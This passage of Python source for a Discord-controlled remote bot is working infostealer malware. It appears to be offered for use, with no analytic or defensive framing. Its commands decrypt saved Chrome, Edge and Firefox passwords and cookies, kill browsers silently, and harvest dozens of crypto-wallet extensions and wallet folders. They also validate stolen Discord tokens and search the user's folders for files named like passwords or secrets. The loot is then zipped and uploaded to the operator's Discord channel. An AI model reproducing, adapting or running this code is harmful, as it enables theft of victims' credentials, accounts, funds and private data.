            copy2(path, cookievault)
            conn = sqlite3.connect(cookievault)
            cursor = conn.cursor()
            with open(os.path.join(f"C:\\Users\\{getuser()}\\cookies.txt"), 'a', encoding="utf-8") as f:
                f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
                for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                    host_key, name, path, encrypted_value, expires_utc = res
                    value = self.decrypt_password(encrypted_value, self.masterkey)
                    if host_key and name and value != "":
                        f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
            cursor.close()
            conn.close()
            os.remove(cookievault)
    
    # Main execution
    await ctx.send("Starting cookie extraction...")
    browser = Browsers()
    await browser.grab_cookies(ctx)
    await ctx.send("Cookie extraction completed!")

@bot.command()
@is_correct_user_channel()
async def pass_light(ctx):
    import os
    import json
    import base64
    import sqlite3
    import win32crypt
    from Crypto.Cipher import AES
    import shutil
    import time
    from datetime import datetime, timedelta
    import zipfile
    import discord
    
    async def upload_to_discord(data, ctx):
        try:
            # Save passwords to file
            temp_dir = os.environ['TEMP']
            passwords_file = os.path.join(temp_dir, 'passwords.txt')
            zip_file = os.path.join(temp_dir, 'passwords.zip')
    
            with open(passwords_file, 'w', encoding='utf-8') as f:
                if data:
                    for url, credentials in data.items():
                        username, password = credentials
                        f.write(f"URL: {url}\n")
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password}\n")
                        f.write("-" * 50 + "\n")
                else:
                    f.write("No passwords found\n")
    
            # Create zip file
            with zipfile.ZipFile(zip_file, 'w') as zipf:
                zipf.write(passwords_file, 'passwords.txt')
    
            # Send the zip file
            with open(zip_file, 'rb') as f:
                await ctx.send(file=discord.File(f, "passwords.zip"))
    
            # Clean up
            if os.path.exists(passwords_file):
                os.remove(passwords_file)
            if os.path.exists(zip_file):
                os.remove(zip_file)
    
        except Exception as e:
            await ctx.send(f"Upload error: {str(e)}")
    
    def get_master_key():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        except:
            return None
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    
    def decrypt_password_edge(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"
    
    def get_passwords_edge():
        master_key = get_master_key()
        if not master_key:
            return {}
    
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        if not os.path.exists(login_db):
            return {}
    
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except:
            return {}
    
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
    
        result = {}
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password_edge(encrypted_password, master_key)
                if username != "" or decrypted_password != "":
                    result[url] = [username, decrypted_password]
        except:
            pass
    
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
    
        return result
    
    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    
    def get_encryption_key():
        try:
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
    
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return None
    
    def decrypt_password_chrome(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    
    def get_chrome_passwords():
        key = get_encryption_key()
        if not key:
            return {}
    
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        if not os.path.exists(db_path):
            return {}
    
        file_name = "ChromeData.db"
        shutil.copyfile(db_path, file_name)
        db = sqlite3.connect(file_name)
        cursor = db.cursor()
    
        result = {}
        try:
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                action_url = row[1]
                username = row[2]
                password = decrypt_password_chrome(row[3], key)
                if username or password:
                    result[action_url] = [username, password]
        except:
            pass
    
        cursor.close()
        db.close()
        try:
            os.remove(file_name)
        except:
            pass
    
        return result
    
    def grab_passwords():
        result = {}
    
        # Get Chrome passwords
        try:
            chrome_passwords = get_chrome_passwords()
            result.update(chrome_passwords)
        except:
            pass
    
        # Get Edge passwords
        try:
            edge_passwords = get_passwords_edge()
            result.update(edge_passwords)
        except:
            pass
    
        return result
    
    # This is the actual command implementation that will be inserted into the bot
    pass_light_command_code = '''
        """Light password grabber for Chrome and Edge"""
        try:
            await ctx.send("🔍 Starting password collection...")
    
            passwords_data = grab_passwords()
    
            if passwords_data:
                await upload_to_discord(passwords_data, ctx)
    
                # Send completion message
                embed = discord.Embed(
                    title="🔑 Password Grabber - Light",
                    description=f"Successfully collected {len(passwords_data)} sets of credentials",
                    colour=discord.Colour.green()
                )
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="🔑 Password Grabber - Light",
                    description="No passwords found in Chrome or Edge browsers",
                    colour=discord.Colour.orange()
                )
                await ctx.send(embed=embed)
    
        except Exception as e:
            embed = discord.Embed(
                title="❌ Password Grabber - Light",
                description=f"Error: {str(e)}",
                colour=discord.Colour.red()
            )
            await ctx.send(embed=embed)
    '''

@bot.command()
@is_correct_user_channel()
async def pass_heavy(ctx, bot_k, cat_id):
    import base64
    import json
    import os
    import re
    import sqlite3
    import shutil
    import subprocess
    import zipfile
    import sys
    import threading
    import concurrent.futures
    from zipfile import ZipFile
    from urllib.request import Request, urlopen
    
    # Install non-standard packages first
    required_packages = [
        "pycryptodome",
        "pywin32",
        "requests"
    ]
    
    for package in required_packages:
        try:
            # Try to import first to check if already installed
            if package == "pycryptodome":
                __import__('Crypto')
            elif package == "pywin32":
                __import__('win32crypt')
            elif package == "requests":
                __import__('requests')
            print(f"✅ {package} already installed")
        except ImportError:
            # Install using pip
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"✅ Installed {package}")
            except subprocess.CalledProcessError:
                print(f"❌ Failed to install {package}")
                sys.exit(1)
    
    # Now import the non-standard packages after installation
    import win32crypt
    import requests
    from Crypto.Cipher import AES
    import discord
    
    # Rest of your existing code continues here...
    async def upload_to_discord(ctx):
        try:
            # Create zip file of all collected data
            zip_path = os.path.join(os.getenv('TEMP'), "heavy_data_collection.zip")
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                storage_path = os.getenv('APPDATA') + "\\gruppe_storage"
                if os.path.exists(storage_path):
                    for root, dirs, files in os.walk(storage_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, storage_path))
    
            # Send the zip file via the command context
            with open(zip_path, 'rb') as f:
                await ctx.send(file=discord.File(f, "heavy_data_collection.zip"))
    
            # Clean up
            if os.path.exists(zip_path):
                os.remove(zip_path)
    
        except Exception as e:
            await ctx.send(f"Error uploading heavy data: {str(e)}")
    
    # Initialize all paths and configurations from original code
    USER_PROFILE = os.getenv('USERPROFILE')
    APPDATA = os.getenv('APPDATA')
    LOCALAPPDATA = os.getenv('LOCALAPPDATA')
    STORAGE_PATH = APPDATA + "\\gruppe_storage"
    STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    if not os.path.exists(STORAGE_PATH):
        os.makedirs(STORAGE_PATH)
    
    # All original browser configurations
    CHROMIUM_BROWSERS = [
        {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
        {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
        {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
        {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
        {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
        {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},
    ]
    
    CHROMIUM_SUBPATHS = [
        {"name": "None", "path": ""},
        {"name": "Default", "path": "Default"},
        {"name": "Profile 1", "path": "Profile 1"},
        {"name": "Profile 2", "path": "Profile 2"},
        {"name": "Profile 3", "path": "Profile 3"},
        {"name": "Profile 4", "path": "Profile 4"},
        {"name": "Profile 5", "path": "Profile 5"},
    ]
    
    # All 58 browser extensions
    BROWSER_EXTENSIONS = [
        {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
        {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
        {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
        {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
        {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
        {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
        {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
        {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
        {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
        {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
        {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
        {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
        {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
        {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
        {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
        {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
        {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
        {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
        {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
        {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
        {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
        {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
        {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
        {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
        {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
        {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
        {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
        {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
        {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
        {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
        {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
        {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
        {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
        {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
        {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
        {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
        {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
        {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
        {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
        {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
        {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
        {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
        {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
        {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
        {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
        {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
        {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
        {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
        {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
        {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
        {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
    ]
    
    # All 11 wallet paths
    WALLET_PATHS = [
        {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
        {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
        {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
        {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
        {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
        {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
        {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
        {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
        {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
        {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
        {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
    ]
    
    # All original paths to search
    PATHS_TO_SEARCH = [
        USER_PROFILE + "\\Desktop",
        USER_PROFILE + "\\Documents",
        USER_PROFILE + "\\Downloads",
        USER_PROFILE + "\\OneDrive\\Documents",
        USER_PROFILE + "\\OneDrive\\Desktop",
    ]
    
    # All 22 file keywords
    FILE_KEYWORDS = [
        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account",
        "acount", "paypal", "banque", "metamask", "wallet", "crypto", "exodus",
        "discord", "2fa", "code", "memo", "compte", "token", "backup", "seecret"
    ]
    
    # All original allowed extensions
    ALLOWED_EXTENSIONS = [
        ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".jpg", ".jpeg",
        ".png", ".gif", ".webp", ".mp4"
    ]
    
    # All 26 Discord paths
    DISCORD_PATHS = [
        {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},
        {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},
        {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},
        {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},
        {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},
        {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},
        {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},
        {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},
        {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},
        {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},
        {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},
        {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},
        {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},
        {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},
        {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},
        {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},
        {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},
        {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},
        {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},
        {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},
        {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},
        {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},
        {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},
        {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},
        {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},
        {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}
    ]
    
    # Global collections
    PASSWORDS = []
    COOKIES = []
    WEB_DATA = []
    DISCORD_TOKENS = []
    DISCORD_IDS = []
    
    def kill_process_hidden(process_name):
        """Kill processes without showing windows"""
        subprocess.run(f'taskkill /F /IM "{process_name}" >nul 2>&1', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    def kill_all_browsers():
        """Kill all browser processes efficiently and hidden"""
        browser_processes = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "msedge.exe", "yandex.exe"]
        for process in browser_processes:
            kill_process_hidden(process)
    
    def decrypt_data(data, key):
        """Decrypt browser data"""
        try:
            if data.startswith(b'v10') or data.startswith(b'v11'):
                iv = data[3:15]
                data = data[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(data)[:-16].decode()
            else:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""
    
    def validate_discord_token(token):
        """Validate Discord token"""
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}, timeout=10)
            if r.status_code == 200:
                return r.json()
        except:
            pass
        return None
    
    def zip_to_storage(name, source, destination):
        """Zip files/folders to storage"""
        try:
            if os.path.isfile(source):
                with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
                    z.write(source, os.path.basename(source))
            else:
                with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
                    for root, dirs, files in os.walk(source):
                        for file in files:
                            file_path = os.path.join(root, file)
                            z.write(file_path, os.path.relpath(file_path, os.path.join(source, '..')))
        except:
            pass
    
    def process_browser_data(browser_info):
        """Process all data for a single browser (passwords, cookies, web data)"""
        browser_name, browser_path = browser_info["name"], browser_info["path"]
    
        try:
            local_state = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state):
                return
    
            with open(local_state, "r", encoding="utf-8") as f:
                local_state_data = json.loads(f.read())
    
            key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
            decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
            # Process each profile
            for subpath in CHROMIUM_SUBPATHS:
                profile_path = os.path.join(browser_path, subpath["path"])
                if not os.path.exists(profile_path):
                    continue
    
                # Process passwords
                try:
                    login_data_file = os.path.join(profile_path, "Login Data")
                    if os.path.exists(login_data_file):
                        temp_db = os.path.join(profile_path, f"{browser_name}-pw.db")
                        shutil.copy(login_data_file, temp_db)
                        connection = sqlite3.connect(temp_db)
                        cursor = connection.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
                        for row in cursor.fetchall():
                            origin_url, username, encrypted_password = row
                            password = decrypt_data(encrypted_password, decryption_key)
                            if username or password:
                                PASSWORDS.append({
                                    "browser": browser_name,
                                    "profile": subpath["name"],
                                    "url": origin_url,
                                    "username": username,
                                    "password": password
                                })
    
                        cursor.close()
                        connection.close()
                        os.remove(temp_db)
                except:
                    pass
    
                # Process cookies
                try:
                    cookies_file = os.path.join(profile_path, "Network", "Cookies")
                    if os.path.exists(cookies_file):
                        temp_db = os.path.join(profile_path, "Network", f"{browser_name}-ck.db")
                        shutil.copy(cookies_file, temp_db)
                        connection = sqlite3.connect(temp_db)
                        cursor = connection.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
                        cookie_str = ""
                        for row in cursor.fetchall():
                            host, name, encrypted_value = row
                            value = decrypt_data(encrypted_value, decryption_key)
                            cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
    
                        if cookie_str:
                            COOKIES.append({
                                "browser": browser_name,
                                "profile": subpath["name"],
                                "cookies": base64.b64encode(cookie_str.encode()).decode()
                            })
    
                        cursor.close()
                        connection.close()
                        os.remove(temp_db)
                except:
                    pass
    
                # Process web data
                try:
                    web_data_file = os.path.join(profile_path, "Web Data")
                    if os.path.exists(web_data_file):
                        temp_db = os.path.join(profile_path, f"{browser_name}-webdata.db")
                        shutil.copy(web_data_file, temp_db)
                        connection = sqlite3.connect(temp_db)
                        cursor = connection.cursor()
                        cursor.execute("SELECT service, encrypted_token FROM token_service")
    
                        for row in cursor.fetchall():
                            web_service, encrypted_token = row
                            web_token = decrypt_data(encrypted_token, decryption_key)
                            WEB_DATA.append({
                                "browser": browser_name,
                                "profile": subpath["name"],
                                "service": web_service,
                                "token": web_token
                            })
    
                        cursor.close()
                        connection.close()
                        os.remove(temp_db)
                except:
                    pass
    
                # Process all 58 browser extensions
                for extension in BROWSER_EXTENSIONS:
                    extension_path = profile_path + extension["path"]
                    if os.path.exists(extension_path):
                        zip_to_storage(f"{browser_name}-{subpath['name']}-{extension['name']}", extension_path, STORAGE_PATH)
    
        except:
            pass
    
    def process_discord_tokens():
        """Process Discord tokens from all 26 paths"""
        for discord_path in DISCORD_PATHS:
            if not os.path.exists(discord_path["path"]):
                continue
    
            try:
                name_without_spaces = discord_path["name"].replace(" ", "")
                if "cord" in discord_path["path"]:
                    local_state_path = APPDATA + f"\\{name_without_spaces}\\Local State"
                    if not os.path.exists(local_state_path):
                        continue
    
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state_data = json.loads(f.read())
    
                    key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
                    decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
                    for file_name in os.listdir(discord_path["path"]):
                        if file_name[-3:] not in ["ldb", "log"]:
                            continue
                        file_path = os.path.join(discord_path["path"], file_name)
                        for line in [x.strip() for x in open(file_path, errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)
                                token_data = validate_discord_token(token)
                                if token_data and token_data["id"] not in DISCORD_IDS:
                                    DISCORD_IDS.append(token_data["id"])
                                    username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                    phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                    DISCORD_TOKENS.append({
                                        "token": token,
                                        "user_id": token_data["id"],
                                        "username": username,
                                        "display_name": token_data["global_name"],
                                        "email": token_data["email"],
                                        "phone": phone_number
                                    })
                else:
                    for file_name in os.listdir(discord_path["path"]):
                        if file_name[-3:] not in ["ldb", "log"]:
                            continue
                        file_path = os.path.join(discord_path["path"], file_name)
                        for line in [x.strip() for x in open(file_path, errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                                token_data = validate_discord_token(token)
                                if token_data and token_data["id"] not in DISCORD_IDS:
                                    DISCORD_IDS.append(token_data["id"])
                                    username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                    phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                    DISCORD_TOKENS.append({
                                        "token": token,
                                        "user_id": token_data["id"],
                                        "username": username,
                                        "display_name": token_data["global_name"],
                                        "email": token_data["email"],
                                        "phone": phone_number
                                    })
            except:
                pass
    
    def process_wallets():
        """Process all 11 wallet paths"""
        for wallet in WALLET_PATHS:
            if os.path.exists(wallet["path"]):
                zip_to_storage(wallet["name"], wallet["path"], STORAGE_PATH)
    
    def search_sensitive_files():
        """Search for sensitive files using all 22 keywords"""
        for path in PATHS_TO_SEARCH:
            if not os.path.exists(path):
                continue
            for root, _, files in os.walk(path):
                for file_name in files:
                    for keyword in FILE_KEYWORDS:
                        if keyword in file_name.lower():
                            for extension in ALLOWED_EXTENSIONS:
                                if file_name.endswith(extension):
                                    try:
                                        file_path = os.path.join(root, file_name)
                                        zip_to_storage(f"sensitive_{file_name}", file_path, STORAGE_PATH)
                                    except:
                                        pass
    
    def process_firefox():
        """Process Firefox data"""
        firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')
        if not os.path.exists(firefox_path):
            return
    
        kill_process_hidden("firefox.exe")
    
        for profile in os.listdir(firefox_path):
            try:
                if profile.endswith('.default') or profile.endswith('.default-release'):
                    profile_path = os.path.join(firefox_path, profile)
                    cookies_file = os.path.join(profile_path, "cookies.sqlite")
                    if os.path.exists(cookies_file):
                        temp_cookies = os.path.join(profile_path, "cookies-copy.sqlite")
                        shutil.copy(cookies_file, temp_cookies)
                        connection = sqlite3.connect(temp_cookies)
                        cursor = connection.cursor()
                        cursor.execute("SELECT host, name, value FROM moz_cookies")
    
                        cookie_str = ""
                        for row in cursor.fetchall():
                            host, name, value = row
                            cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
    
                        if cookie_str:
                            COOKIES.append({
                                "browser": "Firefox",
                                "profile": profile,
                                "cookies": base64.b64encode(cookie_str.encode()).decode()
                            })
    
                        cursor.close()
                        connection.close()
                        os.remove(temp_cookies)
            except:
                continue
    
    def telegram_collection():
        """Collect Telegram data"""
        try:
            kill_process_hidden("Telegram.exe")
            user = os.path.expanduser("~")
